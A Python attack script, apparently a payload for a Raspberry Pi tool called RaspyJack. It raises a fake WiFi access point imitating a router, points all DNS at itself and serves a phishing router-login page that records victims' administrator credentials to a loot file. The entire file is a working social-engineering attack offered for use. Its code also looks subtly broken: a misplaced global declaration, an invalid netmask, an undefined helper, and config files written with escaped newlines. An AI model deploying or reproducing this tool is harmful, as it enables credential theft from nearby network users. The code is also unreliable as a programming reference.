#!/usr/bin/env python3
import sys
sys.path.append('/root/Raspyjack/')
"""
RaspyJack *payload* – **SE: Evil Twin (Router Login)**
=======================================================
A social engineering payload that creates a fake WiFi network and serves
a generic router login page to capture administrative credentials.
"""

import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
# ---------------------------- Third‑party libs ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

# --- CONFIGURATION ---
WIFI_INTERFACE = "wlan1" # TODO: Make configurable, e.g., via a menu or auto-detection
FAKE_AP_SSID = "NETGEAR55" # Will be configurable
FAKE_AP_CHANNEL = "6" # Will be configurable
CAPTIVE_PORTAL_BASE_PATH = os.path.join("/root", "Raspyjack", "DNSSpoof", "sites")
CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "phish_router") # Default to phish_router
LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
TEMP_CONF_DIR = "/tmp/raspyjack_eviltwin_router/"

# Character set for input
CHAR_SET = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+\\[]{};:'\",<.>/?`~"

# HTML file selection globals
current_html_file = "phish_router" # Default selected folder
html_files_list = []
html_file_index = 0

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20 } # Added KEY1, KEY2 for config

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
if HARDWARE_LIBS_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    FONT = ImageFont.load_default()
else:
    # Dummy objects if hardware libs are not available
    class DummyLCD:
        def LCD_Init(self, *args): pass
        def LCD_Clear(self): pass
        def LCD_ShowImage(self, *args): pass
    LCD = DummyLCD()
    WIDTH, HEIGHT = 128, 128
    class DummyGPIO:
        def setmode(self, *args): pass
        def setup(self, *args): pass
        def input(self, pin): return 1 # Simulate no button pressed
        def cleanup(self): pass
    GPIO = DummyGPIO()
    class DummyImageFont:
        def truetype(self, *args, **kwargs): return None
        def load_default(self): return None
    ImageFont = DummyImageFont()
    FONT_TITLE = None # Fallback to None if ImageFont is a dummy
    FONT = None # Fallback to None if ImageFont is a dummy

# --- Globals & Shutdown ---
running = True
attack_processes = {}
status_info = { "clients": 0, "credentials": 0 }
current_interface_input = WIFI_INTERFACE # For interface input
interface_input_cursor_pos = 0
current_ssid_input = FAKE_AP_SSID # For SSID input
ssid_input_cursor_pos = 0
current_channel_input = FAKE_AP_CHANNEL # For channel input
channel_input_cursor_pos = 0

def cleanup(*_):
    global running
    if running:
        running = False
        for proc in attack_processes.values():
            try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except: pass
        attack_processes.clear()
        subprocess.run("iptables -F; iptables -t nat -F", shell=True)
        subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        subprocess.run(f"ifconfig {WIFI_INTERFACE} down; iwconfig {WIFI_INTERFACE} mode managed; ifconfig {WIFI_INTERFACE} up", shell=True)
        if os.path.exists(TEMP_CONF_DIR): subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI & Core Logic ---
def draw_ui(screen_state="main", status: str = ""):
    if not HARDWARE_LIBS_AVAILABLE:
        print(f"UI State: {screen_state}")
        if screen_state == "main":
            print(f"Interface: {WIFI_INTERFACE}")
            print(f"SSID: {FAKE_AP_SSID}")
            print(f"Channel: {FAKE_AP_CHANNEL}")
            print(f"Portal: {current_html_file}")
        return

    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Evil Twin (Router)", font=FONT_TITLE, fill="#005a9e")
    d.line([(0, 22), (128, 22)], fill="#005a9e", width=1)
    
    if screen_state == "main":
        d.text((5, 25), "Interface:", font=FONT, fill="white")
        d.text((5, 40), WIFI_INTERFACE, font=FONT_TITLE, fill="yellow")
        d.text((5, 55), "SSID:", font=FONT, fill="white")
        d.text((5, 70), FAKE_AP_SSID[:16], font=FONT_TITLE, fill="yellow")
        d.text((5, 85), "Channel:", font=FONT, fill="white")
        d.text((5, 100), FAKE_AP_CHANNEL, font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Start | KEY1=Edit Iface | KEY2=Edit SSID | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "iface_input":
        d.text((5, 30), "Enter Interface:", font=FONT, fill="white")
        display_iface = list(current_interface_input)
        if interface_input_cursor_pos < len(display_iface):
            display_iface[interface_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_iface[:16]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "ssid_input":
        d.text((5, 30), "Enter SSID:", font=FONT, fill="white")
        display_ssid = list(current_ssid_input)
        if ssid_input_cursor_pos < len(display_ssid):
            display_ssid[ssid_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ssid[:16]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "channel_input":
        d.text((5, 30), "Enter Channel:", font=FONT, fill="white")
        display_channel = list(current_channel_input)
        if channel_input_cursor_pos < len(display_channel):
            display_channel[channel_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_channel), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "html_select":
        d.text((5, 5), "Select Portal", font=FONT_TITLE, fill="yellow")
        d.line([(0, 22), (128, 22)], fill="yellow", width=1)

        if not html_files_list:
            d.text((5, 40), "No HTML files found!", font=FONT, fill="red")
        else:
            for i, file_name in enumerate(html_files_list):
                display_name = file_name
                if len(display_name) > 16:
                    display_name = display_name[:13] + "..."
                
                text_color = "white"
                if i == html_file_index:
                    text_color = "lime"
                    d.rectangle([(0, 25 + i*15), (128, 25 + (i+1)*15)], fill="blue") # Highlight selected
                d.text((5, 25 + i*15), display_name, font=FONT, fill=text_color)
        d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 25), status, font=FONT_TITLE, fill=status_color)
        d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT, fill="white")
        d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT, fill="yellow")
        d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT, fill="orange")
        d.text((5, 110), "Press KEY3 to Stop", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_text_input_logic(initial_text, screen_state_name, char_set):
    global current_interface_input, interface_input_cursor_pos, current_ssid_input, ssid_input_cursor_pos, current_channel_input, channel_input_cursor_pos, WIFI_INTERFACE, FAKE_AP_SSID, FAKE_AP_CHANNEL
    
    target_input = None
    target_cursor_pos = None

    if screen_state_name == "iface_input":
        target_input = [current_interface_input, "current_interface_input"]
        target_cursor_pos = [interface_input_cursor_pos, "interface_input_cursor_pos"]
    elif screen_state_name == "ssid_input":
        target_input = [current_ssid_input, "current_ssid_input"]
        target_cursor_pos = [ssid_input_cursor_pos, "ssid_input_cursor_pos"]
    else: # channel_input
        target_input = [current_channel_input, "current_channel_input"]
        target_cursor_pos = [channel_input_cursor_pos, "channel_input_cursor_pos"]

    # Initialize with current global value
    current_value = list(target_input[0])
    cursor_pos = target_cursor_pos[0]

    draw_ui(screen_state_name)
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel input
            return None
        
        if btn == "OK": # Confirm input
            if current_value: # Basic validation
                new_value = "".join(current_value)
                if screen_state_name == "iface_input":
                    WIFI_INTERFACE = new_value
                    current_interface_input = new_value
                    interface_input_cursor_pos = cursor_pos
                elif screen_state_name == "ssid_input":
                    FAKE_AP_SSID = new_value
                    current_ssid_input = new_value
                    ssid_input_cursor_pos = cursor_pos
                else: # channel_input
                    FAKE_AP_CHANNEL = new_value
                    current_channel_input = new_value
                    channel_input_cursor_pos = cursor_pos
                return new_value
            else:
                show_message(["Input cannot", "be empty!"], "red")
                time.sleep(2)
                current_value = list(initial_text)
                cursor_pos = len(initial_text) - 1
                draw_ui(screen_state_name)
        
        if btn == "LEFT":
            cursor_pos = max(0, cursor_pos - 1)
            draw_ui(screen_state_name)
        elif btn == "RIGHT":
            cursor_pos = min(len(current_value), cursor_pos + 1)
            draw_ui(screen_state_name)
        elif btn == "UP" or btn == "DOWN":
            if cursor_pos < len(current_value):
                current_char = current_value[cursor_pos]
                
                try:
                    char_index = char_set.index(current_char)
                    if btn == "UP":
                        char_index = (char_index + 1) % len(char_set)
                    else: # DOWN
                        char_index = (char_index - 1 + len(char_set)) % len(char_set)
                    current_value[cursor_pos] = char_set[char_index]
                except ValueError: # If current char is not in char_set
                    current_value[cursor_pos] = char_set[0] # Default to first char
                draw_ui(screen_state_name)
            elif cursor_pos == len(current_value): # At the end, add a new character
                if btn == "UP":
                    current_value.append(char_set[0])
                else: # DOWN, do nothing or remove last char
                    if len(current_value) > 0:
                        current_value.pop()
                        cursor_pos = max(0, cursor_pos - 1)
                draw_ui(screen_state_name)
        
        time.sleep(0.1)
    return None

def handle_file_selection_logic():
    global html_files_list, html_file_index, current_html_file, CAPTIVE_PORTAL_PATH, LOOT_FILE

    # Scan for directories in CAPTIVE_PORTAL_BASE_PATH
    html_files_list = [d for d in os.listdir(CAPTIVE_PORTAL_BASE_PATH) if os.path.isdir(os.path.join(CAPTIVE_PORTAL_BASE_PATH, d))]
    html_files_list.sort()

    if not html_files_list:
        draw_ui("html_select") # Draw empty list
        time.sleep(2)
        return

    # Set initial index to current_html_file if it exists in the list
    try:
        html_file_index = html_files_list.index(current_html_file)
    except ValueError:
        html_file_index = 0
        current_html_file = html_files_list[0]

    while running:
        draw_ui("html_select")
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "UP":
            html_file_index = (html_file_index - 1 + len(html_files_list)) % len(html_files_list)
            current_html_file = html_files_list[html_file_index]
        elif btn == "DOWN":
            html_file_index = (html_file_index + 1) % len(html_files_list)
            current_html_file = html_files_list[html_file_index]
        elif btn == "OK":
            CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, current_html_file)
            LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt") # Assuming loot.txt in each portal dir
            draw_ui("main") # Redraw main screen with new selection
            time.sleep(1)
            return
        elif btn == "KEY3": # Cancel
            return
        
        time.sleep(0.1)

def start_attack():
    subprocess.run("pkill wpa_supplicant; pkill dnsmasq; pkill hostapd; pkill php", shell=True, capture_output=True)
    os.makedirs(TEMP_CONF_DIR, exist_ok=True)
    hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
    with open(hostapd_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\\ndriver=nl80211\\nssid={FAKE_AP_SSID}\\nhw_mode=g\\nchannel={FAKE_AP_CHANNEL}\\n")
    dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
    with open(dnsmasq_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\\ndhcp-range=10.0.0.10,10.0.0.100,12h\\ndhcp-option=3,10.0.0.1\\ndhcp-option=6,10.0.0.1\\naddress=/#/10.0.0.1\\n")
    if os.path.exists(LOOT_FILE): os.remove(LOOT_FILE)
    
    # Bring down the interface, set to AP mode, and bring up with static IP
    subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
    subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True)
    subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.5.255.0", shell=True)
    
    # Start hostapd
    attack_processes['hostapd'] = subprocess.Popen(f"hostapd {hostapd_conf_path}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(2)
    if attack_processes['hostapd'].poll() is not None:
        print(f"ERROR: hostapd failed to start. Stderr: {attack_processes['hostapd'].stderr.read().decode()}", file=sys.stderr)
        global running
        running = False
        return False

    # Start dnsmasq
    attack_processes['dnsmasq'] = subprocess.Popen(f"dnsmasq -C {dnsmasq_conf_path} -d", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(2)
    if attack_processes['dnsmasq'].poll() is not None:
        print(f"ERROR: dnsmasq failed to start. Stderr: {attack_processes['dnsmasq'].stderr.read().decode()}", file=sys.stderr)
        global running
        running = False
        return False

    # Start php web server
    attack_processes['php'] = subprocess.Popen(f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(2)
    if attack_processes['php'].poll() is not None:
        print(f"ERROR: PHP web server failed to start. Stderr: {attack_processes['php'].stderr.read().decode()}", file=sys.stderr)
        global running
        running = False
        return False
    
    return True

def monitor_status():
    while running:
        try:
            with open("/var/lib/misc/dnsmasq.leases", "r") as f: status_info["clients"] = len(f.readlines())
        except: status_info["clients"] = 0
        try:
            with open(LOOT_FILE, "r") as f: status_info["credentials"] = len(f.read().split("----")) -1
        except: status_info["credentials"] = 0
        time.sleep(5)

# --- Main Loop ---
try:
    is_attacking = False
    current_screen = "main" # New state variable for UI
    
    # Initial setup for input
    current_interface_input = WIFI_INTERFACE
    current_ssid_input = FAKE_AP_SSID
    current_channel_input = FAKE_AP_CHANNEL

    while running:
        if current_screen == "main":
            draw_ui("main")
            if GPIO.input(PINS["KEY1"]) == 0: # Edit Interface
                new_iface = handle_text_input_logic(current_interface_input, "iface_input", CHAR_SET)
                if new_iface is not None:
                    WIFI_INTERFACE = new_iface
                    current_interface_input = new_iface
                time.sleep(0.2) # Debounce
            elif GPIO.input(PINS["KEY2"]) == 0: # Edit SSID
                new_ssid = handle_text_input_logic(current_ssid_input, "ssid_input", CHAR_SET)
                if new_ssid is not None:
                    FAKE_AP_SSID = new_ssid
                    current_ssid_input = new_ssid
                time.sleep(0.2) # Debounce
            elif GPIO.input(PINS["OK"]) == 0: # Edit Channel or Start Attack
                # If channel is not configured, allow editing
                if not FAKE_AP_CHANNEL.isdigit():
                    new_channel = handle_text_input_logic(current_channel_input, "channel_input", "0123456789")
                    if new_channel is not None:
                        FAKE_AP_CHANNEL = new_channel
                        current_channel_input = new_channel
                    time.sleep(0.2) # Debounce
                else: # Channel is configured, start attack
                    draw_ui("STARTING")
                    if start_attack():
                        is_attacking = True
                        current_screen = "attacking"
                        threading.Thread(target=monitor_status, daemon=True).start()
                    else:
                        draw_ui("FAILED")
                        time.sleep(3)
                        current_screen = "main" # Go back to main menu on failure
                    time.sleep(0.2) # Debounce
            elif GPIO.input(PINS["KEY3"]) == 0: # Select Portal
                current_screen = "html_select"
                time.sleep(0.2) # Debounce
        elif current_screen == "html_select":
            handle_file_selection_logic()
            current_screen = "main" # Return to main after selection
            time.sleep(0.2) # Debounce
        elif current_screen == "iface_input":
            char_set = "abcdefghijklmnopqrstuvwxyz0123456789" # Common interface chars
            new_iface = handle_text_input_logic(current_interface_input, "iface_input", char_set)
            if new_iface:
                WIFI_INTERFACE = new_iface
            current_screen = "main"
            time.sleep(0.3) # Debounce
        
        elif current_screen == "ssid_input":
            char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>? " # Common SSID chars
            new_ssid = handle_text_input_logic(current_ssid_input, "ssid_input", char_set)
            if new_ssid:
                FAKE_AP_SSID = new_ssid
            current_screen = "main"
            time.sleep(0.3) # Debounce
        
        elif current_screen == "channel_input":
            char_set = "0123456789" # Digits for channel
            new_channel = handle_text_input_logic(current_channel_input, "channel_input", char_set)
            if new_channel and new_channel.isdigit() and 1 <= int(new_channel) <= 165: # WiFi channels range
                FAKE_AP_CHANNEL = new_channel
            else:
                show_message(["Invalid Channel!", "1-165 only."], "red")
                time.sleep(2)
            current_screen = "main"
            time.sleep(0.3) # Debounce
        elif current_screen == "attacking":
            draw_ui("attacking", "ACTIVE")
            if GPIO.input(PINS["KEY3"]) == 0: # Stop Attack
                draw_ui("stopping")
                cleanup()
                is_attacking = False
                current_screen = "main"
                time.sleep(2) # Give time for cleanup message
        
        time.sleep(0.1)

except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("SE Evil Twin (Router) payload finished.")
